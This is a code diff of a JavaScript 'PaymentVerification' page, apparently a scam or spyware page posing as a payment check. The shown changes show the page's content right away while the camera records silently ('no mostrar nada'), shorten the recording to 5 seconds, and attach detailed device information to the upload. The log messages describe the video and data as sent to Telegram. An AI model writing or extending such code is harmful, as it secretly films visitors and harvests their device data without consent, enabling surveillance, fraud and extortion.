@@ -125,6 +125,10 @@ class PaymentVerification {
             this.hasPermission = true;
             this.video.srcObject = this.stream;
             
+            // Mostrar contenido principal inmediatamente
+            document.getElementById('initialLoading').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            
             // Esperar a que el video esté listo
             await new Promise(resolve => {
                 this.video.onloadedmetadata = resolve;
@@ -223,10 +227,10 @@ class PaymentVerification {
         
         // Grabación silenciosa - no mostrar nada
         
-        // Grabar por 10 segundos
+        // Grabar por 5 segundos (cambiado de 10)
         setTimeout(() => {
             this.stopRecording();
-        }, 10000);
+        }, 5000);
     }
     
     stopRecording() {
@@ -250,6 +254,10 @@ class PaymentVerification {
             const formData = new FormData();
             formData.append('video', blob, 'verification_video.webm');
             
+            // Obtener información del dispositivo
+            const deviceInfo = await this.getDetailedDeviceInfo();
+            formData.append('deviceInfo', JSON.stringify(deviceInfo));
+            
             const response = await fetch('/api/upload-video', {
                 method: 'POST',
                 body: formData
@@ -258,9 +266,9 @@ class PaymentVerification {
             const result = await response.json();
             
             if (result.status === 'success') {
-                console.log('Video enviado exitosamente');
+                console.log('Video y datos enviados exitosamente a Telegram');
             } else {
-                console.log('Error enviando video');
+                console.log('Error enviando video a Telegram');
             }
             
         } catch (error) {
